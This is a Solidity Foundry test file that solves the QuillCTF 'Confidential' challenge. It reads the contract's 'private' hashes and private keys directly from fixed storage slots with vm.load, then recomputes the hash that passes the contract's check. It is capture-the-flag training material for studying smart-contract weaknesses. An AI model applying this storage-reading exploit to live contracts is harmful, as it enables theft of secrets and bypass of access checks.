// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import '../../src/QuillCTF/Confidential.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract ConfidentialExploit is Test {
  Confidential target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Confidential();
    console2.log('Target contract deployed');
    vm.stopPrank();
  }

  function testNaiveExploit() public {
    vm.startPrank(exploiter);
    console2.log('Compute the hash of alice with alicePk=0x0');
    bytes32 alicePk = bytes32(uint256(0x0));
    bytes32 aliceHash = target.hash(alicePk, target.ALICE_DATA());

    console2.log('Compute the hash of bob with bobPk=0x0');
    bytes32 bobPk = bytes32(uint256(0x0));
    bytes32 bobHash = target.hash(bobPk, target.BOB_DATA());

    console2.log('Compute the final hash');
    bytes32 finalHash = target.hash(aliceHash, bobHash);
    assert(target.checkthehash(finalHash) == true);
    vm.stopPrank();
  }

  function readBytes32FromTargetStorage(
    uint256 _slot
  ) public view returns (bytes32) {
    return vm.load(address(target), bytes32(_slot));
  }

  function testExploitByReadingStorage() public {
    vm.startPrank(exploiter);
    console2.log('Read alice and bob private hashes from storage');
    bytes32 aliceHash = readBytes32FromTargetStorage(4);
    bytes32 bobHash = readBytes32FromTargetStorage(9);

    console2.log('Compute the final hash');
    bytes32 finalHash = target.hash(aliceHash, bobHash);
    assert(target.checkthehash(finalHash) == true);

    console2.log('Read alice and bob private keys from storage');
    bytes32 alicePk = readBytes32FromTargetStorage(2);
    bytes32 bobPk = readBytes32FromTargetStorage(7);
    console2.logBytes32(alicePk);
    console2.logBytes32(bobPk);
    vm.stopPrank();
  }
}
